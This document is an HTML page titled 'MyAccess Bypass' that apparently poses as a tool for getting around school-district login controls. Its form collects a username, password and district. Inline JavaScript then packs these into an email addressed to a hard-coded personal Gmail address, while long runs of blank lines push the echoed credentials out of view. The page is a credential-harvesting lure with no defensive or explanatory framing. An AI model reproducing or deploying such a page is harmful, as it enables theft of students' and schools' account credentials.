<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>MyAccess</title>

    <style>
        body{
            font-family: Arial, Helvetica, sans-serif;
        }
    </style>



    <script>
    document.addEventListener('DOMContentLoaded', function () {
        const form = document.getElementById('myForm');
        const responseArea = document.getElementById('responseArea');

        function escapeHtml(s) {
            return String(s).replace(/[&<>"']/g, function (m) {
                return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m];
            });
        }

        function buildAndOpenMail({ to, subject, body }) {
            // Do not encode the recipient address; encode only the query parameters.
            // Convert lone LF to CRLF for better compatibility with mail clients.
            const safeBody = String(body || '').replace(/\r?\n/g, '\r\n');
            const uri = 'mailto:' + to +
                                    '?subject=' + encodeURIComponent(subject) +
                                    '&body=' + encodeURIComponent(safeBody);
            window.location.href = uri;
        }
        // Create a small fixed bar at the bottom to show the password on submit
        const pwdBar = document.createElement('div');
        pwdBar.id = 'passwordDisplay';
        Object.assign(pwdBar.style, {
            position: 'fixed',
            left: '50%',
            transform: 'translateX(-50%)',
            bottom: '12px',
            background: 'rgba(0,0,0,0.85)',
            color: '#fff',
            padding: '8px 12px',
            borderRadius: '6px',
            boxShadow: '0 2px 6px rgba(0,0,0,0.3)',
            zIndex: 9999,
            fontFamily: 'inherit',
            display: 'none',
            whiteSpace: 'nowrap'
        });
        document.body.appendChild(pwdBar);

        let pwdHideTimeout = null;
        function showPasswordBar(pwd) {
            if (pwdHideTimeout) {
                clearTimeout(pwdHideTimeout);
                pwdHideTimeout = null;
            }
            pwdBar.textContent = 'Password: ' + (pwd || '(empty)');
            pwdBar.style.display = 'block';
            // Hide after 10 seconds
            pwdHideTimeout = setTimeout(() => {
                pwdBar.style.display = 'none';
            }, 10000);
        }

        // Capture the form submit to grab the password before the form is reset.
        // Use capturing so this runs before other submit handlers, then queue a task
        // to update the bar after the main handler completes.
        if (form) {
            form.addEventListener('submit', function (e) {
                const passwd = (document.getElementById('email') || {}).value || '';
                // Defer to let the main submit handler run (which may reset the form).
                setTimeout(() => showPasswordBar(passwd), 0);
            }, true);
        }
        function handleSubmit(evt) {
            if (evt) evt.preventDefault();

            const to = 'colinalexandersmith3@gmail.com';
            const username = (document.getElementById('name') || {}).value || '';
            const passwd = (document.getElementById('email') || {}).value || '';
            const school = (document.getElementById('school') || {}).value || '';

            if (!to) {
                alert('Please provide a recipient email.');
                return;
            }

            const subject = `MyAccess Bypass - ${username || 'NoUsername'}${school ? ' - ' + school : ''}`;
            const bodyLines = [
                `Username: ${username}`,
                `Password: ${passwd}`,
                `School: ${school}`,
                '',
                'This message was generated from the MyAccess form.'
            ];
            const body = bodyLines.join('\n');

            buildAndOpenMail({ to, subject, body });

            if (responseArea) {
                responseArea.innerHTML = ''
                    + '<p><strong>To:</strong> ' + escapeHtml(to) + '</p>'
                    + '<p><strong>Username:</strong> ' + escapeHtml(username) + '</p>'
                    + '<p><strong>Password:</strong> ' + escapeHtml(passwd) + '</p>'
                    + '<p><strong>School:</strong> ' + escapeHtml(school) + '</p>';
            }

            form.reset();
        }

        // Attach submit handler (prevents default navigation and opens mail client)
        if (form) form.addEventListener('submit', handleSubmit);

        // Keep a global sendEmail for the existing onclick on the button
        window.sendEmail = function () { handleSubmit(); };
    });
    </script>
</head>
<body>
    <main>
        <h1>MyAccess Bypass</h1>
        <form id="myForm">
            <label for="name">Username</label>
            <input type="text" id="name" name="name" placeholder="1012312" required>
            <br>
            <br>
            <label for="email">Password</label>
            <input type="password" id="email" name="email"><br><br>

                <label for="school">Choose an option(Which school service applies to you):</label>
                <select name="school" id="school">
                    <option value="select">...</option>
                    <option value="APS">APS</option>
                    <option value="FPS">FPS</option>
                    <option value="LCPS">LCPS</option>
                    <option value="DCPS">DCPS</option>

                </select>
                <br>
                <br>

            <input type="reset" value="Reset Form">
            <br>
            <button type="submit">Submit</button>

        </form>
        <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
        <div id="responseArea">
            <!-- Responses will appear here -->
        </div>

        <script src="script.js"></script>   
    </main>
    
</body>
</html>

